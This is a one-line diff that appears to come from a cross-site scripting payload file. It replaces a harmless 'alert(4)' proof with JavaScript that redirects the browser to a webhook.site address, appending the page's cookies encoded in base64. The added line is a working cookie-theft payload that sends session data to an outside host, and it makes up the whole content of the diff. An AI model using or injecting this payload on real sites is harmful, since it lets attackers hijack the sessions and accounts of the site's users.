@@ -1,1 +1,1 @@
-alert(4)
+window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?cookie=" + btoa(document.cookie)
